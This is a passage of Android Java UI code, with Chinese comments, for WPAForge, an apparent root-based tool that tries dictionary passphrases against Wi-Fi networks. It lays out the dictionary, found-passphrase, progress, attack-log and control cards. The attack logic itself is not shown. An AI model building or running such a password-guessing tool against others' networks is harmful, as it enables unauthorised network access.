        netMetaView.setTypeface(Typeface.MONOSPACE);
        netMetaView.setSingleLine(true);
        netMetaView.setEllipsize(TextUtils.TruncateAt.END);
        LinearLayout.LayoutParams nmlp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        nmlp.topMargin = px(7);
        netCard.addView(netMetaView, nmlp);

        // 第二层之二：执行通道 / 每次耗时（沿用 updateConnectMode 的既有实现）
        connectModeView = new TextView(this);
        connectModeView.setTextSize(AmberTheme.FS_BODY);
        connectModeView.setTextColor(TEXT_DIM);
        connectModeView.setSingleLine(false);
        connectModeView.setMaxLines(2);
        // 不可点：只有一种执行方式，点开弹「仅支持 Root」是噪音。
        connectModeView.setClickable(false);
        connectModeView.setFocusable(false);
        LinearLayout.LayoutParams cmlp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        cmlp.topMargin = px(4);
        netCard.addView(connectModeView, cmlp);

        pageConnect.addView(netCard, cardLp(0));

        // ================= ② 字典卡 =================
        LinearLayout dictCard = AmberTheme.card(this, dp, R);
        dictCard.addView(AmberTheme.label(this, L.s("字典", "DICTIONARY")));
        connectDictView = new TextView(this);
        connectDictView.setTextSize(AmberTheme.FS_STATE);
        connectDictView.setTextColor(TEXT_DIM);
        connectDictView.setSingleLine(true);
        connectDictView.setEllipsize(TextUtils.TruncateAt.END);
        connectDictView.setOnClickListener(v -> {
            if (usePlanMode) showPlanManager();
            else showDictSource();
        });
        LinearLayout.LayoutParams dlp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        dlp.topMargin = px(5);
        dictCard.addView(connectDictView, dlp);
        pageConnect.addView(dictCard, cardLp(AmberTheme.GAP_CARD));

        /* 破解页**不再展示任何 Wi-Fi 开关状态**（2026-11-03）。
         *
         * 曾经这里有一条"请先打开 Wi-Fi 开关"的红字提示。问题是：执行链为了
         * 强制重新关联，会短暂关/开 Wi-Fi，系统开关查询在这个窗口里读到 false
         * —— 于是**手机明明开着 Wi-Fi，破解页却闪一下红字**（用户实测到过，
         * 会让人怀疑设备或软件执行条件）。
         *
         * 破解页的职责不是报系统开关状态；真正的环境安全检查在 RootProber
         * （开跑前）与执行引擎（关联失败即判失败/阻塞）里，一条都没动。 */

        // ================= ③ 命中卡（命中时才显示） =================
        hitCard = new LinearLayout(this);
        hitCard.setOrientation(LinearLayout.VERTICAL);
        hitCard.setPadding(px(AmberTheme.PAD_H), px(AmberTheme.PAD_V),
                px(AmberTheme.PAD_H), px(AmberTheme.PAD_V));
        hitCard.setBackground(roundBgStatic(AmberTheme.OK_BG, R));
        hitCard.setVisibility(View.GONE);

        LinearLayout hitTop = new LinearLayout(this);
        hitTop.setOrientation(LinearLayout.HORIZONTAL);
        hitTop.setGravity(Gravity.CENTER_VERTICAL);
        TextView hitTitle = new TextView(this);
        hitTitle.setTextSize(AmberTheme.FS_MONO);
        hitTitle.setTextColor(OK_GREEN);
        hitTitle.setTypeface(Typeface.create("sans-serif-medium", Typeface.NORMAL));
        hitTop.addView(hitTitle, new LinearLayout.LayoutParams(
                0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f));
        TextView hitCopy = new TextView(this);
        hitCopy.setText(L.s("复制", "Copy"));
        hitCopy.setTextSize(AmberTheme.FS_SMALL);
        hitCopy.setTextColor(ACCENT);
        hitCopy.setPadding(px(10), px(4), px(10), px(4));
        hitCopy.setBackground(roundBg(AmberTheme.ACCENT_BG, AmberTheme.RADIUS_CHIP));
        hitCopy.setClickable(true);
        hitCopy.setFocusable(true);
        hitCopy.setOnClickListener(v -> {
            String pw = hitPw == null ? "" : hitPw.getText().toString();
            if (pw.isEmpty()) return;
            android.content.ClipboardManager cm = (android.content.ClipboardManager)
                    getSystemService(CLIPBOARD_SERVICE);
            if (cm != null) {
                cm.setPrimaryClip(android.content.ClipData.newPlainText("WPAForge", pw));
                Toast.makeText(this, L.s("口令已复制", "Passphrase copied"),
                        Toast.LENGTH_SHORT).show();
            }
        });
        hitTop.addView(hitCopy);
        hitCard.addView(hitTop);
        hitCard.setTag(hitTitle);      // 标题文字在命中时才填（带 SSID）

        hitPw = new TextView(this);
        hitPw.setTextSize(AmberTheme.FS_DISPLAY);
        hitPw.setTextColor(TEXT);
        hitPw.setTypeface(Typeface.MONOSPACE);
        hitPw.setPadding(0, px(6), 0, px(2));
        hitPw.setTextIsSelectable(true);
        hitCard.addView(hitPw);

        hitMeta = new TextView(this);
        hitMeta.setTextSize(AmberTheme.FS_SMALL);
        hitMeta.setTextColor(TEXT_DIM);
        hitCard.addView(hitMeta);

        pageConnect.addView(hitCard, cardLp(AmberTheme.GAP_CARD));

        // ================= ④b 结算卡（跑完之后的结论）=================
        resultCard = AmberTheme.card(this, dp, R);
        resultCard.setVisibility(View.GONE);

        resultTitle = new TextView(this);
        resultTitle.setTextSize(AmberTheme.FS_STATE);
        resultTitle.setTextColor(TEXT);
        resultTitle.setTypeface(Typeface.create("sans-serif-medium", Typeface.NORMAL));
        resultCard.addView(resultTitle);

        resultSub = new TextView(this);
        resultSub.setTextSize(AmberTheme.FS_BODY);
        resultSub.setTextColor(TEXT_DIM);
        LinearLayout.LayoutParams rslp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        rslp.topMargin = px(4);
        resultCard.addView(resultSub, rslp);

        resultWhy = new TextView(this);
        resultWhy.setTextSize(AmberTheme.FS_BODY);
        resultWhy.setTextColor(AmberTheme.TEXT_DIM);
        resultWhy.setLineSpacing(px(4), 1f);
        LinearLayout.LayoutParams rwlp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        rwlp.topMargin = px(10);
        resultCard.addView(resultWhy, rwlp);

        resultActions = new LinearLayout(this);
        resultActions.setOrientation(LinearLayout.HORIZONTAL);
        resultActions.setPadding(0, px(12), 0, 0);
        resultCard.addView(resultActions);
        pageConnect.addView(resultCard, cardLp(AmberTheme.GAP_CARD));

        // ================= ④ 任务进度卡 =================
        progressCard = AmberTheme.card(this, dp, R);

        LinearLayout progTop = new LinearLayout(this);
        progTop.setOrientation(LinearLayout.HORIZONTAL);
        progTop.setGravity(Gravity.BOTTOM);

        stateBig = new TextView(this);
        stateBig.setTextSize(AmberTheme.FS_STATE);
        stateBig.setTextColor(AmberTheme.TEXT_DIM);
        stateBig.setTypeface(Typeface.create("sans-serif-medium", Typeface.NORMAL));
        /*
         * 状态行**允许折两行**（2026-11-02 收口）。
         *
         * 原来 setSingleLine(true) + ellipsize=END：字体放大到 1.3× 时，
         * 「‖ 已暂停 · 进度已保留」这种长状态会被截成「‖ 已暂停 · 进度…」——
         * 偏巧截掉的正是「进度已保留」这句用户最需要看到的。
         * 现在最多两行，宁可占一行高度也不丢信息。
         */
        stateBig.setSingleLine(false);
        stateBig.setMaxLines(2);
        stateBig.setEllipsize(null);
        progTop.addView(stateBig, new LinearLayout.LayoutParams(
                0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f));

        statPctView = new TextView(this);
        statPctView.setTextSize(AmberTheme.FS_HERO);
        statPctView.setTextColor(ACCENT);
        statPctView.setTypeface(Typeface.MONOSPACE);
        statPctView.setText("—");                 // 未就绪时是「—」，不编一个 0.0%
        statPctView.setTextColor(AmberTheme.TEXT_FAINT);   // 未知态弱色，有数才转琥珀
        progTop.addView(statPctView);
        progressCard.addView(progTop);

        LinearLayout statRow = new LinearLayout(this);
        statRowView = statRow;
        statRow.setOrientation(LinearLayout.HORIZONTAL);
        statDoneView = AmberTheme.stat(this);
        statTotalView = AmberTheme.stat(this);
        statWrongView = AmberTheme.stat(this);
        statUnkView = AmberTheme.stat(this);
        statDoneView.setText("—");
        statTotalView.setText("—");
        statWrongView.setText("—");
        statUnkView.setText("—");
        // 未知态一律用弱色：30sp 的亮琥珀「—」看起来像一根进度条，容易被当成数据
        statDoneView.setTextColor(AmberTheme.TEXT_FAINT);
        statTotalView.setTextColor(AmberTheme.TEXT_FAINT);
        statWrongView.setTextColor(AmberTheme.TEXT_FAINT);
        statUnkView.setTextColor(AmberTheme.TEXT_FAINT);
        // 四列：已执行 / 已证实错误 / 未确定 / 总数。
        // 「已证实错误」用危险色、「未确定」用告警色 —— 两者视觉上必须不同：
        // 前者说明这条密码被证明了是错的，后者只说明我们没拿到证据。
        statRow.addView(AmberTheme.statColumn(this, dp, L.s("已执行", "TRIED"), statDoneView),
                weight());
        statRow.addView(AmberTheme.statColumn(this, dp, L.s("已证实错误", "PROVEN WRONG"),
                statWrongView), weight());
        statRow.addView(AmberTheme.statColumn(this, dp, L.s("未确定", "UNCERTAIN"),
                statUnkView), weight());
        statRow.addView(AmberTheme.statColumn(this, dp, L.s("总数", "TOTAL"), statTotalView),
                weight());
        LinearLayout.LayoutParams srlp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        srlp.topMargin = px(12);
        progressCard.addView(statRow, srlp);

        // 进度条沿用既有 StagedProgress（分层 / 流光 / 动画都在它里面），
        // 只把配色接到主题上，避免「页面主色」与「进度条主色」各写一个值。
        connectProgress = new io.github.wlmosv_png.wpaforge.ui.StagedProgress(this);
        connectProgress.setPalette(ACCENT, AmberTheme.ACCENT_DIM, AmberTheme.ACCENT_MID,
                TEXT, AmberTheme.TEXT_DIM, AmberTheme.CARD_2,
                OK_GREEN, AmberTheme.OK_DIM, AmberTheme.OK_MID);
        LinearLayout.LayoutParams plp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        plp.topMargin = px(14);
        connectProgress.setVisibility(View.GONE);
        progressCard.addView(connectProgress, plp);

        LinearLayout footRow = new LinearLayout(this);
        footRowView = footRow;
        footRow.setOrientation(LinearLayout.HORIZONTAL);
        statRateView = new TextView(this);
        statRateView.setTextSize(AmberTheme.FS_BODY);
        statRateView.setTextColor(AmberTheme.TEXT_DIM);
        statEtaView = new TextView(this);
        statEtaView.setTextSize(AmberTheme.FS_BODY);
        statEtaView.setTextColor(AmberTheme.TEXT_DIM);
        statEtaView.setGravity(Gravity.END);
        statRateView.setText(L.s("速率 待测", "rate —"));
        statEtaView.setText(L.s("剩余 待估", "ETA —"));
        footRow.addView(statRateView, new LinearLayout.LayoutParams(
                0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f));
        footRow.addView(statEtaView, new LinearLayout.LayoutParams(
                0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f));
        LinearLayout.LayoutParams frlp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        frlp.topMargin = px(10);
        progressCard.addView(footRow, frlp);

        // ── 多字典计划 / 本次跳过 ────────────────────────────────────────
        // 「跳过」必须拆成「已证实错误」与「没跑出结果」两半显示：
        // 只写「跳过 120 条」，用户没法判断里面有没有可能包含正确密码。
        planLineView = new TextView(this);
        planLineView.setTextSize(AmberTheme.FS_SMALL);
        planLineView.setTextColor(AmberTheme.TEXT_DIM);
        planLineView.setVisibility(View.GONE);
        LinearLayout.LayoutParams pllp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        pllp.topMargin = px(8);
        progressCard.addView(planLineView, pllp);

        finishNote = new TextView(this);
        finishNote.setTextSize(AmberTheme.FS_SMALL);
        finishNote.setTextColor(ACCENT);
        finishNote.setLineSpacing(px(3), 1f);
        finishNote.setVisibility(View.GONE);
        LinearLayout.LayoutParams fnlp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        fnlp.topMargin = px(10);
        progressCard.addView(finishNote, fnlp);

        pageConnect.addView(progressCard, cardLp(AmberTheme.GAP_CARD));

        // ================= ⑤ 状态与事件卡 =================
        eventCard = AmberTheme.card(this, dp, R);

        // 当前处理项（等宽大字 + 上两条）
        // 词汇改过：原来叫「当前候选」—— 跑完之后它还挂在那儿，
        // 会让用户以为"还在跑"。现在分两个词：
        //   运行中 = 正在尝试（主动语态）
        //   结束后 = 最后尝试（陈述事实，且**不说"完成"**——没找到不算完成）
        candLabel = AmberTheme.label(this, L.s("正在尝试", "TRYING"));
        candRoll = new io.github.wlmosv_png.wpaforge.ui.CandidateRoll(this);
        LinearLayout.LayoutParams candLp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        candLp.topMargin = px(5);
        candRoll.setLayoutParams(candLp);
        candPrev = new TextView(this);
        candPrev.setTextSize(AmberTheme.FS_SMALL);
        candPrev.setTextColor(AmberTheme.TEXT_FAINT);
        candPrev.setTypeface(Typeface.MONOSPACE);
        candPrev.setLineSpacing(px(3), 1f);
        candPrev.setPadding(0, px(4), 0, 0);
        candPrev.setVisibility(View.GONE);
        candBox = new LinearLayout(this);
        candBox.setOrientation(LinearLayout.VERTICAL);
        candBox.setVisibility(View.GONE);
        candBox.addView(candLabel);
        candBox.addView(candRoll);
        candBox.addView(candPrev);
        eventCard.addView(candBox);

        // 攻击流工具条：折叠 / 级别筛选 / 清空（语义与回调不变）
        flowHeader = new LinearLayout(this);
        flowHeader.setOrientation(LinearLayout.HORIZONTAL);
        flowHeader.setGravity(Gravity.CENTER_VERTICAL);
        flowHeader.setPadding(0, px(12), 0, px(6));

        /*
         * 展开/收起指示（2026-11-02 第二次重绘）。
         *
         * 演变：11.5sp 裸三角（太小、看不出可点）-> 32dp 黄色圆钮（太大、太抢眼）
         * -> 现在这样：三角形保留，但用**触摸区**而不是**视觉块**来保证可点。
         *
         * 用户要的是「一个三角形」，不是一颗按钮。所以：
         *   · 视觉：只有一个 15sp 的实心三角，无背景、无描边；
         *   · 触控：左右 10dp 内边距撑到 ~46dp 宽 —— 拇指能点中，
         *     但屏幕上看到的仍然只是一枚小三角；
         *   · 整行标题依旧可点，双保险。
         */
        flowChevron = new TextView(this);
        flowChevron.setTextSize(AmberTheme.FS_STATE);
        flowChevron.setTextColor(ACCENT);
        flowChevron.setGravity(Gravity.CENTER);
        // 视觉是三角，触控靠 padding 撑开（不用固定 LayoutParams，避免又变回大块）
        flowChevron.setPadding(px(10), px(10), px(12), px(10));
        flowChevron.setBackground(null);
        flowChevron.setClickable(true);
        flowChevron.setFocusable(true);
        flowChevron.setOnClickListener(v -> toggleStream());
        flowHeader.addView(flowChevron);

        flowLabel = new TextView(this);
        flowLabel.setTextSize(AmberTheme.FS_LABEL);
        flowLabel.setTextColor(TEXT_DIM);
        flowLabel.setLetterSpacing(0.12f);
        flowLabel.setText(L.s("攻击流", "CANDIDATES"));
        LinearLayout.LayoutParams flp = new LinearLayout.LayoutParams(
                0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f);
        flp.leftMargin = px(6);
        flowHeader.addView(flowLabel, flp);

        flowCount = new TextView(this);
        flowCount.setTextSize(AmberTheme.FS_SMALL);
        flowCount.setTextColor(AmberTheme.TEXT_FAINT);
        LinearLayout.LayoutParams fcp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        fcp.rightMargin = px(12);
        flowHeader.addView(flowCount, fcp);

        chipKey = new TextView(this);
        chipKey.setText(L.s("关键", "Key"));
        chipKey.setTextSize(AmberTheme.FS_SMALL);
        chipKey.setPadding(px(9), px(4), px(9), px(4));
        chipKey.setClickable(true);
        chipKey.setFocusable(true);
        chipKey.setOnClickListener(v -> {
            streamKeyOnly = true;
            styleFlowChips();
            renderStream();
        });
        LinearLayout.LayoutParams ckp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        ckp.rightMargin = px(6);
        flowHeader.addView(chipKey, ckp);

        chipAll = new TextView(this);
        chipAll.setText(L.s("全部", "All"));
        chipAll.setTextSize(AmberTheme.FS_SMALL);
        chipAll.setPadding(px(9), px(4), px(9), px(4));
        chipAll.setClickable(true);
        chipAll.setFocusable(true);
        chipAll.setOnClickListener(v -> {
            streamKeyOnly = false;
            styleFlowChips();
            renderStream();
        });
        LinearLayout.LayoutParams chp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        chp.rightMargin = px(10);
        flowHeader.addView(chipAll, chp);
        styleFlowChips();

        flowClear = new TextView(this);
        flowClear.setText(L.s("清空", "Clear"));
        flowClear.setTextSize(AmberTheme.FS_SMALL);
        flowClear.setTextColor(DANGER);
        flowClear.setPadding(px(10), px(4), px(10), px(4));
        flowClear.setBackground(roundBg(AmberTheme.DANGER_BG, AmberTheme.RADIUS_CHIP));
        flowClear.setOnClickListener(v -> {
            streamBuffer.clear();          // SpannableStringBuilder 用 clear()
            streamBuffer.clearSpans();     // 一起清掉残留的颜色 span
            streamLines.clear();           // 全量列表也清，否则切「全部」会又冒出来
            if (connectStreamView != null) connectStreamView.setText("");
            updateFlowHeader();
            updateJumpLatest();
            updateEmptyHint();
            applyStreamHeight();           // 清空后收起日志区，不留一大块空白
            Toast.makeText(this, L.s("现场已清空", "Log cleared"),
                    Toast.LENGTH_SHORT).show();
        });
        flowClear.setClickable(true);
        flowClear.setFocusable(true);
        flowHeader.addView(flowClear);

        flowHeader.setOnClickListener(v -> toggleStream());
        eventCard.addView(flowHeader);

        connectStreamView = new TextView(this);
        connectStreamView.setTextSize(AmberTheme.FS_LOG);
        connectStreamView.setTextColor(TEXT_DIM);
        connectStreamView.setTypeface(Typeface.MONOSPACE);
        connectStreamView.setPadding(px(14), px(12), px(14), px(12));
        // 不要开 setTextIsSelectable：
        // 可选模式的 TextView 会把滑动手势吃掉（它要处理文本选择），
        // 表现就是「日志滚不动」。需要复制时用「导出日志」。
        connectStreamView.setTextIsSelectable(false);
        connectStreamView.setLineSpacing(px(4), 1f);
        connectStreamView.setHorizontallyScrolling(false);

        streamScroll = new android.widget.ScrollView(this);
        streamScroll.setBackground(roundBgStatic(SUNKEN, AmberTheme.RADIUS_CARD));
        streamScroll.setFillViewport(true);
        streamScroll.setVerticalScrollBarEnabled(true);
        streamScroll.setScrollBarStyle(android.view.View.SCROLLBARS_INSIDE_INSET);
        streamScroll.setScrollbarFadingEnabled(false);
        streamScroll.setOverScrollMode(android.view.View.OVER_SCROLL_ALWAYS);
        streamScroll.addView(connectStreamView);

        // 手指落在日志区时明确告诉外层「这段手势归我」，否则外层 ScrollView 会截走滑动。
        streamScroll.setOnTouchListener((v, e) -> {
            if (e.getAction() == android.view.MotionEvent.ACTION_DOWN) {
                v.getParent().requestDisallowInterceptTouchEvent(true);
                streamAutoScroll = false;
                updateJumpLatest();
            } else if (e.getAction() == android.view.MotionEvent.ACTION_UP
                    || e.getAction() == android.view.MotionEvent.ACTION_CANCEL) {
                v.getParent().requestDisallowInterceptTouchEvent(false);
                android.view.View child = streamScroll.getChildAt(0);
                if (child != null
                        && streamScroll.getScrollY() + streamScroll.getHeight()
                           >= child.getMeasuredHeight() - px(24)) {
                    streamAutoScroll = true;
                }
                updateJumpLatest();
            }
            return false;
        });

        streamParams = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, px(300));

        // 「回到最新」浮标固定在日志区右下角内侧（不压工具条）。
        android.widget.FrameLayout streamWrap = new android.widget.FrameLayout(this);
        streamWrapView = streamWrap;
        streamWrap.addView(streamScroll, new android.widget.FrameLayout.LayoutParams(
                android.widget.FrameLayout.LayoutParams.MATCH_PARENT,
                android.widget.FrameLayout.LayoutParams.MATCH_PARENT));

        jumpLatestBtn = new TextView(this);
        jumpLatestBtn.setText(L.s("↓ 最新", "↓ Latest"));
        jumpLatestBtn.setTextSize(AmberTheme.FS_SMALL);
        jumpLatestBtn.setTextColor(ON_ACCENT);
        jumpLatestBtn.setTypeface(Typeface.create("sans-serif-medium", Typeface.NORMAL));
        jumpLatestBtn.setPadding(px(12), px(6), px(12), px(6));
        jumpLatestBtn.setBackground(roundBg(ACCENT, AmberTheme.RADIUS_CHIP));
        jumpLatestBtn.setVisibility(View.GONE);
        jumpLatestBtn.setOnClickListener(v -> {
            streamAutoScroll = true;
            if (streamScroll != null) {
                streamScroll.post(() ->
                        streamScroll.fullScroll(android.view.View.FOCUS_DOWN));
            }
            updateJumpLatest();
        });
        android.widget.FrameLayout.LayoutParams jflp =
                new android.widget.FrameLayout.LayoutParams(
                        android.widget.FrameLayout.LayoutParams.WRAP_CONTENT,
                        android.widget.FrameLayout.LayoutParams.WRAP_CONTENT);
        jflp.gravity = Gravity.BOTTOM | Gravity.END;
        jflp.rightMargin = px(12);
        jflp.bottomMargin = px(12);
        streamWrap.addView(jumpLatestBtn, jflp);

        eventCard.addView(streamWrap, streamParams);

        // 空状态引导：与日志区**二选一**显示，不再各占一块。
        connectEmptyHint = new TextView(this);
        connectEmptyHint.setTextSize(AmberTheme.FS_BODY);
        connectEmptyHint.setTextColor(TEXT_DIM);
        connectEmptyHint.setGravity(Gravity.CENTER);
        connectEmptyHint.setPadding(px(16), px(22), px(16), px(22));
        connectEmptyHint.setBackground(roundBgStatic(SUNKEN, AmberTheme.RADIUS_CARD));
        eventCard.addView(connectEmptyHint);
        updateEmptyHint();

        pageConnect.addView(eventCard, cardLp(AmberTheme.GAP_CARD));

        // ================= ⑥ 底部操作卡 =================
        actionsCard = AmberTheme.card(this, dp, R);
        LinearLayout actions = new LinearLayout(this);
        actions.setOrientation(LinearLayout.HORIZONTAL);

        startBtn = primaryAction(L.s("▶ 开始", "▶ Start"), ACCENT, ON_ACCENT);
        startBtn.setOnClickListener(v -> startConnect());
        actions.addView(startBtn, actParams(0, 1.6f));

        pauseBtn = primaryAction(L.s("‖ 暂停", "‖ Pause"), AmberTheme.NEUTRAL_BG);
        pauseBtn.setOnClickListener(v -> onPauseResumeClicked());
        actions.addView(pauseBtn, actParams(8, 1f));

        stopBtn = primaryAction(L.s("■ 停止", "■ Stop"), AmberTheme.DANGER_BG, DANGER);
        stopBtn.setOnClickListener(v -> onStopClicked());
        actions.addView(stopBtn, actParams(8, 1f));
        actionsCard.addView(actions);

        actionsHint = AmberTheme.label(this, "");
        LinearLayout.LayoutParams ahlp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        ahlp.topMargin = px(9);
        actionsCard.addView(actionsHint, ahlp);

        pageConnect.addView(actionsCard, cardLp(AmberTheme.GAP_CARD));

        // 队列（多目标才有意义，空时不占位置）
        queueBox = new LinearLayout(this);
        queueBox.setOrientation(LinearLayout.VERTICAL);
        queueBox.setPadding(0, px(AmberTheme.GAP_CARD), 0, 0);
        pageConnect.addView(queueBox);

        // 开关与高级设置仍收在弹窗里，主界面不再占位置
        smartToggle = null;
        targetDictToggle = null;

        // 初始化显示（与改版前同一组调用，顺序一致）
        updateTargetLabel();
        updateConnectDict();
        updateConnectMode();
        renderProgressCardState();
        applyStreamHeight();
        updateFlowHeader();
        refreshQueue();
    }

    /** 卡片在页面里的通用外间距（卡片之间保持一致的视觉间距） */
    private LinearLayout.LayoutParams cardLp(int topMarginDp) {
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        if (topMarginDp > 0) lp.topMargin = px(topMarginDp);
        return lp;
    }

    /** 静态圆角面（卡片内部、日志底）：无可点语义，不加波纹 */
    private android.graphics.drawable.Drawable roundBgStatic(int color, float radiusDp) {
        return io.github.wlmosv_png.wpaforge.ui.UiKit.round(color, dp(radiusDp));
    }

    /**
     * 进度卡的「当前状态」大字与底部可用性说明。
     *
     * <p><b>只读现有状态</b>：队列里任务的真实 {@code state} + 服务是否在跑 +
     * 最近一次任务的真实 outcome。这里不新增状态位、不推断「成功/失败」，
     * 也不把「未知」写成「正常」。
     */
    /**
     * **当前队列的聚合状态 —— 唯一的运行状态来源**（U2）。
     *
     * <h3>为什么必须抽出来</h3>
     * 真机实测（2026-11-02）：破解页顶部显示「已暂停 · 进度已保留」，
     * 同一屏的攻击流空状态却写着「准备就绪 · 点下面的「▶ 开始」」——
     * 一个是「有暂停的任务」，一个是「什么都没有」。用户完全不知道该点开始还是继续。
     *
     * <p>根因：两个地方各自推断状态 ——
     * {@code renderProgressCardState()} 看 {@code queueCache} 的任务状态，
     * 空状态提示只看「有没有选目标和字典」。它们不共享任何模型。
     *
     * <p>现在两处都调本方法。
     */
    private TaskQueue.State currentQueueState() {
        // 运行/待处理优先（有任务在动就不是"暂停"）
        for (TaskQueue.Task t : queueCache) {
            if (t.state == TaskQueue.State.RUNNING || t.state == TaskQueue.State.PENDING) {
                return t.state;
            }
        }
        for (TaskQueue.Task t : queueCache) {
            if (t.state == TaskQueue.State.PAUSED) return TaskQueue.State.PAUSED;
        }
        return null;
    }

    private void renderProgressCardState() {
        String text;
        int color;
        /* 状态**以队列为准**，服务是否存活只用来决定"能不能点开始"。
         *
         * <p>踩过的坑：`running || st == RUNNING` 里的 running 取自
         * {@code CrackService.isRunning()}，而那个标志在任务正常跑完后**仍然是 true**
         * （服务实例还活着，只有 STOPPED 才会置回 false）。
         * 结果就是——跑完了、去看别的字典、返回，界面又变回「运行中 100%」，
         * 用户在等一个永远不会来的结果。**跑完了是什么就该显示什么。** */
        boolean serviceRunning = CrackService.isRunning();
        TaskQueue.State st = currentQueueState();   // U2：唯一来源
        /*
         * 状态视觉统一（2026-11-02 收口）。
         *
         * 收口前 RUNNING / PAUSED / PENDING **共用同一个 ACCENT 色** ——
         * 扫一眼分不出「在跑」「停了」「还没开始」。现在按语义分三色 + 前缀符号：
         *   ▶ 运行中   ACCENT（主色，活跃）
         *   ‖ 已暂停   WARN  （琥珀偏暗，停住了但不是错）
         *   … 准备中   TEXT_DIM（过渡态，刻意弱化）
         * 结束态沿用 outcome 的颜色（命中绿 / 停止红 / 未命中灰）。
         */
        if (st == TaskQueue.State.PAUSED) {
            text = L.s("‖ 已暂停 · 进度已保留", "‖ Paused · progress kept");
            color = AmberTheme.WARN;
        } else if (st == TaskQueue.State.RUNNING) {
            // 只有"队列里真有任务在跑"才叫运行中/收尾中
            text = finishingNow
                    ? L.s("▶ 收尾中", "▶ Finishing up")
                    : L.s("▶ 运行中", "▶ Running");
            color = ACCENT;
        } else if (st == TaskQueue.State.PENDING) {
            text = L.s("… 准备中", "… Preparing");
            color = AmberTheme.TEXT_DIM;
        } else if (!lastOutcomeLabel.isEmpty()) {
            text = lastOutcomeLabel;
            color = lastOutcomeColor;
        } else {
            text = L.s("空闲 · 未开始", "Idle · not started");
            color = AmberTheme.TEXT_DIM;
        }
        if (stateBig != null) {
            stateBig.setText(text);
            stateBig.setTextColor(color);
        }
        /*
         * 空态收紧（2026-11-02 用户截图）。
         *
         * 「空闲 · 未开始」时，下面那两行（四列统计 + 速率/剩余）全是「—」，
         * 既没有信息又把卡片撑得很空。设计上应该**没数据就不占位**：
         * 有任务在跑、暂停中、或跑过至少一轮（有结论/有计数）时才显示。
         */
        boolean hasData = st == TaskQueue.State.RUNNING
                || st == TaskQueue.State.PAUSED
                || st == TaskQueue.State.PENDING
                || lastTested > 0
                || !lastOutcomeLabel.isEmpty()
                || lastTallyConfirmed > 0
                || lastTallyInconclusive > 0;
        if (statRowView != null) {
            statRowView.setVisibility(hasData ? View.VISIBLE : View.GONE);
        }
        if (footRowView != null) {
            footRowView.setVisibility(hasData ? View.VISIBLE : View.GONE);
        }
        if (statPctView != null) {
            // 右上角的大数字同理：没数据时不摆一个「—」在那儿
            statPctView.setVisibility(hasData ? View.VISIBLE : View.GONE);
        }
        if (actionsHint != null) {
            /* 提示行必须和状态行说同一件事。
             *
             * <p>同类矛盾：上一版用服务存活来判 canStart，于是跑完那一刻
             * 状态行已经写「已结束 · 未命中」，提示行却还挂着「任务进行中」——
             * 同一张卡里两句话互相打脸。
             *
             * <p>现在按**队列事实**判；服务侧本来就有自我保护
             * （{@code startQueue()} 见 worker 还活着会拒绝并记一行日志），
             * 所以这里可以放行，不会真的开出两次任务。 */
            boolean canStart = st == null || st == TaskQueue.State.PAUSED;
            actionsHint.setText(!canStart
                    ? L.s("任务进行中 · 可暂停或停止", "Task active · pause or stop")
                    : serviceRunning
                        ? L.s("上一轮还在收尾 · 现在点开始会排在它后面",
                              "previous run is wrapping up; start will queue behind it")
                        : L.s("可以开始 · 开始前会先登记目标配置",
                              "Ready · the target config is saved first"));
            actionsHint.setTextColor(AmberTheme.TEXT_FAINT);
        }
    }

    // ================================================================ 结算卡

    /**
     * 跑完之后给结论。
     *
     * <p>设计要点（用户提的"跑完还没出来，用户觉得是垃圾"）：
     *  1. **把"没中"当成一等公民**：它是一个正常、明确、可解释的结果，不是空状态；
     *  2. **三种"没中"必须分开**：全部有结论 ≠ 有 N 条无结论 ≠ 没跑完。
     *     跟判定链"宁可报不确定，也不报假成功"是同一条原则；
     *  3. **用本机真实战绩当依据**，而不是空口安慰；
     *  4. **给下一步**，并且允许放弃（不给退路，用户只会卸载）。
     */
    private void showResultCard(TaskQueue.Task task, String outcome) {
        if (resultCard == null || task == null) return;
        /* 主线程守卫：这个方法碰一堆 View，一旦被工作线程调到就是
         * CalledFromWrongThreadException。与其在调用方逐处小心，
